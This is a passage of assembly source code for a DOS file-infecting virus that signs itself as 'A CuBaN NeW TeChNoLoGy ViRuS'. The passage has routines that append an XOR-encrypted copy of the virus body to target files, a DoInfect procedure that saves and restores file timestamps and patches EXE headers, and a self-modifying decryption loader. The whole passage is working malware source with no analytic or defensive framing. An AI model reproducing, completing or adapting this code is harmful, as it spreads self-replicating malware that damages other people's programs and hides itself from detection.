                db      89h,16h   ; mov Key_Value,dx
                Var ReOfs098,Key_Value
                mov     bp,dx
                db      0C4h,3Eh  ; les di,dword ptr OfsFName
                Var ReOfs099,OfsFName
                call    SeekLoader
                jc      @@2
                db      0BEh      ; mov si,VirusOffset
VirusOffset     dw      0
                db      8Eh,6     ; mov es,ScrSeg
                Var ReOfs100,ScrSeg

                mov     di,TempBuffer
                push    es di
                mov     cx,VirSize/2
@@1:
                lodsw
                xor     ax,bp
                stosw
                loop    @@1
                pop     dx ds
                mov     cx,VirSize
                call    WriteFile
@@2:
                pop     di es ds
                ret
AppendVirus     endp
;[]===============[]
DoInfect        proc    near
                cld
                push    ax cx dx si es di bp
                push    cs
                pop     ds
                call    SetInt24
                db      0C4h,3Eh       ; les di,dword ptr SubIP
                Var ReOfs101,SubIP
                call    TestFile
                jc      @@1
                jz      @@2
                db      3Bh,3Eh        ; cmp di,SaveEPB
                Var ReOfs102,SaveEPB
                jz      @@1
                db      0C4h,3Eh       ; les di,dword ptr SaveEPB
                Var ReOfs103,SaveEPB
                call    TestFile
                jc      @@1
                jz      @@2
@@1:
                jmp     @@3
@@2:
                cmp     di,0FFD0h
                jae     @@1
                db      0A1h           ; mov ax,SegFName
                Var ReOfs104,SegFName
                mov     cx,es
                sub     ax,cx
                db      0A3h           ; mov ReloVirSeg,ax
                Var ReOfs105,ReloVirSeg
                db      0A1h           ; mov ax,OfsFName
                Var ReOfs106,OfsFName
                db      0A3h           ; mov ReloVirOfs,ax
                Var ReOfs107,ReloVirOfs

                mov     ax,5700h
                int     21h
                db      89h,0Eh        ; mov FileTime,cx
                Var ReOfs108,FileTime
                db      89h,16h        ; mov FileDate,dx
                Var ReOfs109,FileDate

                mov     ah,2Ah
                int     21h
                add     dl,14
                and     dl,31
                mov     dh,dl
                db      86h,16h        ; xchg dl,DemoDay1
                Var ReOfs110,DemoDay1
                add     dh,14
                and     dh,31
                db      86h,36h        ; xchg dh,DemoDay2
                Var ReOfs111,DemoDay2
                push    dx
                call    AppendVirus
                pop     dx
                db      88h,16h        ; mov DemoDay1,dl
                Var ReOfs112,DemoDay1
                db      88h,36h        ; mov DemoDay2,dh
                Var ReOfs113,DemoDay2
                jc      @@3

                cmp     ax,VirSize
                jnz     @@3
                call    MergeLoader
                jc      @@3
                db      81h,3Eh        ; cmp ExeHdr,5A4Dh
                Var ReOfs114,ExeHdr
                dw      5A4Dh
                jnz     @@3
                call    FixExeSize
@@3:
                call    SetFDate_Close
                call    ResetInt24
                pop     bp di es si dx cx ax
                ret
DoInfect        endp
;[]===============[]
Loader          proc    near
                pushf
                push    cs
                call    _Loader
_Loader:
                push    cx ds si
                mov     si,sp
                mov     si,ss:[si+6] ; SI ==> _Loader
                mov     byte ptr cs:[si+@@2-_Loader],0E2h
                jmp     $+2
                mov     si,cs
                db      81h, 0C6h ; add si,cs:ReloVirSeg
ReloVirSeg      dw      ?         ; 12h
                mov     ds,si
                db      0BEh      ; mov si,cs:ReloVirOfs
ReloVirOfs      dw      ?         ; 0Eh
                mov     cx,VirSize/2
                push    ds si     ; For return far to Virus
@@1:
                db      81h, 34h  ; xor word ptr [si],Key_Value
Key_Value       dw      ?
                inc     si
                inc     si
@@2:
                db      0B4h, offset @@1-@@2-2 ; convert to loop @@1
                retf
LdrSize         equ     $-Loader
Loader          endp
;[]===============[]
DataSave        db      14 dup (?), 0CDh, 20h
                db      LdrSize dup (?)
;[]===============[]
RelocateTab     label   word
                dw      ReOfs001,ReOfs002,ReOfs003,ReOfs004,ReOfs005
                dw      ReOfs006,ReOfs007,ReOfs008,ReOfs009,ReOfs010
                dw      ReOfs011,ReOfs012,ReOfs013,ReOfs014,ReOfs015
                dw      ReOfs016,ReOfs017,ReOfs018,ReOfs019,ReOfs020
                dw      ReOfs021,ReOfs022,ReOfs023,ReOfs024,ReOfs025
                dw      ReOfs026,ReOfs027,ReOfs028,ReOfs029,ReOfs030
                dw      ReOfs031,ReOfs032,ReOfs033,ReOfs034,ReOfs035
                dw      ReOfs036,ReOfs037,ReOfs038,ReOfs039,ReOfs040
                dw      ReOfs041,ReOfs042,ReOfs043,ReOfs044,ReOfs045
                dw      ReOfs046,ReOfs047,ReOfs048,ReOfs049,ReOfs050
                dw      ReOfs051,ReOfs052,ReOfs053,ReOfs054,ReOfs055
                dw      ReOfs056,ReOfs057,ReOfs058,ReOfs059,ReOfs060
                dw      ReOfs061,ReOfs062,ReOfs063,ReOfs064,ReOfs065
                dw      ReOfs066,ReOfs067,ReOfs068,ReOfs069,ReOfs070
                dw      ReOfs071,ReOfs072,ReOfs073,ReOfs074,ReOfs075
                dw      ReOfs076,ReOfs077,ReOfs078,ReOfs079,ReOfs080
                dw      ReOfs081,ReOfs082,ReOfs083,ReOfs084,ReOfs085
                dw      ReOfs086,ReOfs087,ReOfs088,ReOfs089,ReOfs090
                dw      ReOfs091,ReOfs092,ReOfs093,ReOfs094,ReOfs095
                dw      ReOfs096,ReOfs097,ReOfs098,ReOfs099,ReOfs100
                dw      ReOfs101,ReOfs102,ReOfs103,ReOfs104,ReOfs105
                dw      ReOfs106,ReOfs107,ReOfs108,ReOfs109,ReOfs110
                dw      ReOfs111,ReOfs112,ReOfs113,ReOfs114
CountReOfs      equ     ($-RelocateTab) shr 1
Copyright       db      "­ A CuBaN NeW TeChNoLoGy ViRuS By SoMeBoDy !$"
Len_Copyr       equ     $-Copyright
VirSize         equ     $-Begin
Code_Seg        ends
                end     Start
